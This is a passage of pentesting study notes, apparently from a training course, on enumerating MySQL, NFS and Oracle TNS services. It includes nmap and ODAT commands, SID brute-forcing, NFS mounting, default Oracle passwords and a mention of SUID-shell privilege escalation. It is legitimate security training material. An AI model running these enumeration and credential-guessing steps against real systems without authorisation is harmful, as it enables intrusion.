|\n| performance_schema |\n| sys                |\n+--------------------+\n4 rows in set (0.006 sec)\n\n\nMySQL [(none)]&gt; select version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 8.0.27-0ubuntu0.20.04.1 |\n+-------------------------+\n1 row in set (0.001 sec)\n\n\nMySQL [(none)]&gt; use mysql;\nMySQL [mysql]&gt; show tables;\n+------------------------------------------------------+\n| Tables_in_mysql                                      |\n+------------------------------------------------------+\n| columns_priv                                         |\n| component                                            |\n| db                                                   |\n| default_roles                                        |\n| engine_cost                                          |\n| func                                                 |\n| general_log                                          |\n| global_grants                                        |\n| gtid_executed                                        |\n| help_category                                        |\n| help_keyword                                         |\n| help_relation                                        |\n| help_topic                                           |\n| innodb_index_stats                                   |\n| innodb_table_stats                                   |\n| password_history                                     |\n...SNIP...\n| user                                                 |\n+------------------------------------------------------+\n37 rows in set (0.002 sec)\n</code></pre> <p>If we look at the existing databases, we will see several already exist. The most important databases for the MySQL server are the <code>system schema</code> (<code>sys</code>) and <code>information schema</code> (<code>information_schema</code>). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the reference manual of MySQL.</p> <pre><code>mysql&gt; use sys;\nmysql&gt; show tables;  \n\n+-----------------------------------------------+\n| Tables_in_sys                                 |\n+-----------------------------------------------+\n| host_summary                                  |\n| host_summary_by_file_io                       |\n| host_summary_by_file_io_type                  |\n| host_summary_by_stages                        |\n| host_summary_by_statement_latency             |\n| host_summary_by_statement_type                |\n| innodb_buffer_stats_by_schema                 |\n| innodb_buffer_stats_by_table                  |\n| innodb_lock_waits                             |\n| io_by_thread_by_latency                       |\n...SNIP...\n| x$waits_global_by_latency                     |\n+-----------------------------------------------+\n\n\nmysql&gt; select host, unique_users from host_summary;\n\n+-------------+--------------+                   \n| host        | unique_users |                   \n+-------------+--------------+                   \n| 10.129.14.1 |            1 |                   \n| localhost   |            2 |                   \n+-------------+--------------+                   \n2 rows in set (0,01 sec)  \n</code></pre> <p>The <code>information schema</code> is also a database that contains metadata. However, this metadata is mainly retrieved from the <code>system schema</code> database. The reason for the existence of these two is the ANSI/ISO standard that has been established. <code>System schema</code> is a Microsoft system catalog for SQL servers and contains much more information than the <code>information schema</code>.</p> <p>Some of the commands we should remember and write down for working with MySQL databases are described below in the table.</p> Command Description <code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP address&gt;</code> Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. <code>show databases;</code> Show all databases. <code>use &lt;database&gt;;</code> Select one of the existing databases. <code>show tables;</code> Show all available tables in the selected database. <code>show columns from &lt;table&gt;;</code> Show all columns in the selected database. <code>select * from &lt;table&gt;;</code> Show everything in the desired table. <code>select * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";</code> Search for needed <code>string</code> in the desired table. <p>We must know how to interact with different databases. Therefore, we recommend installing and configuring a MySQL server on one of our VMs for experimentation. There is also a widely covered security issues section in the reference manual that covers best practices for securing MySQL servers. We should use this when setting up our MySQL server to understand better why something might not work.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Overview/","title":"Overview","text":"<p><code>MySQL</code> is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the SQL database language. MySQL works according to the <code>client-server principle</code> and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension <code>.sql</code>, for example, like <code>wordpress.sql</code>.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Overview/#mysql-clients","title":"MySQL Clients","text":"<p>The MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Depending on the use of the database, access is possible via an internal network or the public Internet.</p> <p>One of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost. However, as explained in more detail in the module Introduction to Web Applications, there are database structures that are distributed across multiple servers also.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Overview/#mysql-databases","title":"MySQL Databases","text":"<p>MySQL is ideally suited for applications such as <code>dynamic websites</code>, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as LAMP (Linux, Apache, MySQL, PHP), or when using Nginx, as LEMP. In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:</p> Headers Texts Meta tags Forms Customers Usernames Administrators Moderators Email addresses User information Permissions Passwords External/Internal links Links to Files Specific contents Values <p>Sensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as One-Way-Encryption.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Overview/#mysql-commands","title":"MySQL Commands","text":"<p>A MySQL database translates the commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various <code>SQL injections</code> can provoke. Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.</p> <p>The web application sends the generated information back to the client if the data is processed correctly. This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc. SQL commands can display, modify, add or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.</p> <p><code>MariaDB</code>, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company <code>MySQL AB</code> after it was acquired by <code>Oracle</code> and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>However, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:</p> Option Description <code>rw</code> Read and write permissions. <code>insecure</code> Ports above 1024 will be used. <code>nohide</code> If another file system was mounted below an exported directory, this directory is exported by its own exports entry. <code>no_root_squash</code> All files created by root are kept with the UID/GID 0. <p>It is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.</p> <p>We can take a look at the <code>insecure</code> option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Default%20Configuration/","title":"Default Configuration","text":"<p>NFS is not difficult to configure because there are not as many options as FTP or SMB have. The <code>/etc/exports</code> file contains a table of physical filesystems on an NFS server accessible by the clients. The NFS Exports Table shows which options it accepts and thus indicates which options are available to us.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Default%20Configuration/#exports-file","title":"Exports File","text":"<pre><code>arenwald@htb[/htb]$ cat /etc/exports \n\n# /etc/exports: the access control list for filesystems which may be exported\n#               to NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n</code></pre> <p>The default <code>exports</code> file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.</p> Option Description <code>rw</code> Read and write permissions. <code>ro</code> Read only permissions. <code>sync</code> Synchronous data transfer. (A bit slower) <code>async</code> Asynchronous data transfer. (A bit faster) <code>secure</code> Ports above 1024 will not be used. <code>insecure</code> Ports above 1024 will be used. <code>no_subtree_check</code> This option disables the checking of subdirectory trees. <code>root_squash</code> Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents <code>root</code> from accessing files on an NFS mount. <p>Let us create such an entry for test purposes and play around with the settings.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Default%20Configuration/#exportfs","title":"ExportFS","text":"<pre><code>root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' &gt;&gt; /etc/exports\nroot@nfs:~# systemctl restart nfs-kernel-server \nroot@nfs:~# exportfs\n\n/mnt/nfs        10.129.14.0/24\n</code></pre> <p>We have shared the folder <code>/mnt/nfs</code> to the subnet <code>10.129.14.0/24</code> with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>When footprinting NFS, the TCP ports <code>111</code> and <code>2049</code> are essential. We can also get information about the NFS service and the host via RPC, as shown below in the example.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00018s latency).\n\nPORT    STATE SERVICE VERSION\n111/tcp open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      41982/udp6  mountd\n|   100005  1,2,3      45837/tcp   mountd\n|   100005  1,2,3      47217/tcp6  mountd\n|   100005  1,2,3      58830/udp   mountd\n|   100021  1,3,4      39542/udp   nlockmgr\n|   100021  1,3,4      44629/tcp   nlockmgr\n|   100021  1,3,4      45273/tcp6  nlockmgr\n|   100021  1,3,4      47524/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp open  nfs_acl 3 (RPC #100227)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.58 seconds\n</code></pre> <p>The <code>rpcinfo</code> NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports. Also, for NFS, Nmap has some NSE scripts that can be used for the scans. These can then show us, for example, the <code>contents</code> of the share and its <code>stats</code>.</p> <pre><code>arenwald@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00021s latency).\n\nPORT     STATE SERVICE VERSION\n111/tcp  open  rpcbind 2-4 (RPC #100000)\n| nfs-ls: Volume /mnt/nfs\n|   access: Read Lookup NoModify NoExtend NoDelete NoExecute\n| PERMISSION  UID    GID    SIZE  TIME                 FILENAME\n| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .\n| ??????????  ?      ?      ?     ?                    ..\n| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa\n| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub\n| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share\n|_\n| nfs-showmount: \n|_  /mnt/nfs 10.129.14.0/24\n| nfs-statfs: \n|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink\n|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      41982/udp6  mountd\n|   100005  1,2,3      45837/tcp   mountd\n|   100005  1,2,3      47217/tcp6  mountd\n|   100005  1,2,3      58830/udp   mountd\n|   100021  1,3,4      39542/udp   nlockmgr\n|   100021  1,3,4      44629/tcp   nlockmgr\n|   100021  1,3,4      45273/tcp6  nlockmgr\n|   100021  1,3,4      47524/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp open  nfs_acl 3 (RPC #100227)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds\n</code></pre> <p>Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/#show-available-nfs-shares","title":"Show Available NFS Shares","text":"<pre><code>arenwald@htb[/htb]$ showmount -e 10.129.14.128\n\nExport list for 10.129.14.128:\n/mnt/nfs 10.129.14.0/24\n</code></pre>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/#mounting-nfs-share","title":"Mounting NFS Share","text":"<pre><code>arenwald@htb[/htb]$ mkdir target-NFS\narenwald@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\narenwald@htb[/htb]$ cd target-NFS\narenwald@htb[/htb]$ tree .\n\n.\n\u2514\u2500\u2500 mnt\n    \u2514\u2500\u2500 nfs\n        \u251c\u2500\u2500 id_rsa\n        \u251c\u2500\u2500 id_rsa.pub\n        \u2514\u2500\u2500 nfs.share\n\n2 directories, 3 files\n</code></pre> <p>There we will have the opportunity to access the rights and the usernames and groups to whom the shown and viewable files belong. Because once we have the usernames, group names, UIDs, and GUIDs, we can create them on our system and adapt them to the NFS share to view and modify the files.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/#list-contents-with-usernames-group-names","title":"List Contents with Usernames &amp; Group Names","text":"<pre><code>arenwald@htb[/htb]$ ls -l mnt/nfs/\n\ntotal 16\n-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv\n-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub\n-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa\n-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub\n-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share\n</code></pre>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/#list-contents-with-uids-guids","title":"List Contents with UIDs &amp; GUIDs","text":"<pre><code>arenwald@htb[/htb]$ ls -n mnt/nfs/\n\ntotal 16\n-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv\n-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub\n-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh\n-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa\n-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub\n-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share\n</code></pre> <p>It is important to note that if the <code>root_squash</code> option is set, we cannot edit the <code>backup.sh</code> file even as <code>root</code>.</p> <p>We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the <code>SUID</code> of that user and then run the shell via the SSH user.</p> <p>After we have done all the necessary steps and obtained the information we need, we can unmount the NFS share.</p>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/NFS%20%28111%2C2049%29/Footprinting%20the%20Service/#unmounting","title":"Unmounting","text":"<pre><code>arenwald@htb[/htb]$ cd ..\narenwald@htb[/htb]$ sudo umount ./target-NFS\n</code></pre>","tags":["Pentesting","Information_Gathering","NFS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Default%20Configuration/","title":"Default Configuration","text":"<p>The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the <code>TCP/1521</code> port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including <code>TCP/IP</code>, <code>UDP</code>, <code>IPX/SPX</code>, and <code>AppleTalk</code>. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in <code>Oracle 8i</code>/<code>9i</code> but not in Oracle 10g/11g.</p> <p>The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called <code>tnsnames.ora</code> and <code>listener.ora</code> and are typically located in the <code>$ORACLE_HOME/network/admin</code> directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.</p> <p>Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, <code>CHANGE_ON_INSTALL</code>, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, <code>dbsnmp</code> that we should remember when we come across this one. Another example would be that many organizations still use the <code>finger</code> service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.</p> <p>Each database or service has a unique entry in the tnsnames.ora file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple <code>tnsnames.ora</code> file might look like this:</p>","tags":["Information_Gathering","Pentesting","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Default%20Configuration/#tnsnamesora","title":"Tnsnames.ora","text":"<pre><code>ORCL =\n  (DESCRIPTION =\n    (ADDRESS_LIST =\n      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))\n    )\n    (CONNECT_DATA =\n      (SERVER = DEDICATED)\n      (SERVICE_NAME = orcl)\n    )\n  )\n</code></pre> <p>Here we can see a service called <code>ORCL</code>, which is listening on port <code>TCP/1521</code> on the IP address <code>10.129.11.102</code>. Clients should use the service name <code>orcl</code> when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.</p> <p>On the other hand, the <code>listener.ora</code> file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.</p>","tags":["Information_Gathering","Pentesting","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Default%20Configuration/#listenerora","title":"Listener.ora","text":"<pre><code>SID_LIST_LISTENER =\n  (SID_LIST =\n    (SID_DESC =\n      (SID_NAME = PDB1)\n      (ORACLE_HOME = C:\\oracle\\product\\19.0.0\\dbhome_1)\n      (GLOBAL_DBNAME = PDB1)\n      (SID_DIRECTORY_LIST =\n        (SID_DIRECTORY =\n          (DIRECTORY_TYPE = TNS_ADMIN)\n          (DIRECTORY = C:\\oracle\\product\\19.0.0\\dbhome_1\\network\\admin)\n        )\n      )\n    )\n  )\n\nLISTENER =\n  (DESCRIPTION_LIST =\n    (DESCRIPTION =\n      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))\n      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))\n    )\n  )\n\nADR_BASE_LISTENER = C:\\oracle\n</code></pre> <p>In short, the client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses, while the listener process uses the <code>listener.ora</code> file to determine the services it should listen to and the behavior of the listener.</p> <p>Oracle databases can be protected by using so-called PL/SQL Exclusion List (<code>PlsqlExclusionList</code>). It is a user-created text file that needs to be placed in the <code>$ORACLE_HOME/sqldeveloper</code> directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.</p> Setting Description <code>DESCRIPTION</code> A descriptor that provides a name for the database and its connection type. <code>ADDRESS</code> The network address of the database, which includes the hostname and port number. <code>PROTOCOL</code> The network protocol used for communication with the server <code>PORT</code> The port number used for communication with the server <code>CONNECT_DATA</code> Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. <code>INSTANCE_NAME</code> The name of the database instance the client wants to connect. <code>SERVICE_NAME</code> The name of the service that the client wants to connect to. <code>SERVER</code> The type of server used for the database connection, such as dedicated or shared. <code>USER</code> The username used to authenticate with the database server. <code>PASSWORD</code> The password used to authenticate with the database server. <code>SECURITY</code> The type of security for the connection. <code>VALIDATE_CERT</code> Whether to validate the certificate using SSL/TLS. <code>SSL_VERSION</code> The version of SSL/TLS to use for the connection. <code>CONNECT_TIMEOUT</code> The time limit in seconds for the client to establish a connection to the database. <code>RECEIVE_TIMEOUT</code> The time limit in seconds for the client to receive a response from the database. <code>SEND_TIMEOUT</code> The time limit in seconds for the client to send a request to the database. <code>SQLNET.EXPIRE_TIME</code> The time limit in seconds for the client to detect a connection has failed. <code>TRACE_LEVEL</code> The level of tracing for the database connection. <code>TRACE_DIRECTORY</code> The directory where the trace files are stored. <code>TRACE_FILE_NAME</code> The name of the trace file. <code>LOG_FILE</code> The file where the log information is stored.","tags":["Information_Gathering","Pentesting","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#oracle-tools-setupsh","title":"Oracle-Tools-setup.sh","text":"<pre><code>#!/bin/bash\n\nsudo apt-get install libaio1 python3-dev alien -y\ngit clone https://github.com/quentinhardy/odat.git\ncd odat/\ngit submodule init\ngit submodule update\nwget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip\nunzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip\nwget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip\nunzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip\nexport LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH\nexport PATH=$LD_LIBRARY_PATH:$PATH\npip3 install cx_Oracle\nsudo apt-get install python3-scapy -y\nsudo pip3 install colorlog termcolor passlib python-libnmap\nsudo apt-get install build-essential libgmp-dev -y\npip3 install pycryptodome\n</code></pre> <p>After that, we can try to determine if the installation was successful by running the following command:</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#testing-odat","title":"Testing ODAT","text":"<pre><code>arenwald@htb[/htb]$ ./odat.py -h\n\nusage: odat.py [-h] [--version]\n               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}\n               ...\n\n            _  __   _  ___ \n           / \\|  \\ / \\|_ _|\n          ( o ) o ) o || | \n           \\_/|__/|_n_||_| \n-------------------------------------------\n  _        __           _           ___ \n / \\      |  \\         / \\         |_ _|\n( o )       o )         o |         | | \n \\_/racle |__/atabase |_n_|ttacking |_|ool \n-------------------------------------------\n\nBy Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)\n...SNIP...\n</code></pre> <p>Oracle Database Attacking Tool (<code>ODAT</code>) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.</p> <p>Let's now use <code>nmap</code> to scan the default Oracle TNS listener port.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST\nNmap scan report for 10.129.204.235\nHost is up (0.0041s latency).\n\nPORT     STATE SERVICE    VERSION\n1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.64 seconds\n</code></pre> <p>We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (<code>SID</code>) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's <code>SID</code> along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the <code>tnsnames.ora</code> file is used.</p> <p>The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.</p> <p>There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like <code>nmap</code>, <code>hydra</code>, <code>odat</code>, and others. Let us use <code>nmap</code> first.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#nmap-sid-bruteforcing","title":"Nmap - SID Bruteforcing","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST\nNmap scan report for 10.129.204.235\nHost is up (0.0044s latency).\n\nPORT     STATE SERVICE    VERSION\n1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)\n| oracle-sid-brute: \n|_  XE\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 55.40 seconds\n</code></pre> <p>We can use the <code>odat.py</code> tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the <code>all</code> option and try all modules of the <code>odat.py</code> tool.</p>","tags":["Pentesting","Information_Gathering","Oracle_TNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/Oracle%20TNS%20%281521%29/Footprinting%20the%20Service/#odat","title":"ODAT","text":"<pre><code>arenwald@htb[/htb]$ ./odat.py all -s 10.129.204.235\n\n[+] Checking if target 10.129.204.235:1521 is well configured for a connection...\n[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...\n\n...SNIP...\n\n[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 \n[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 \n[!] Notice: 'outln' account is locked, so skipping this username for password           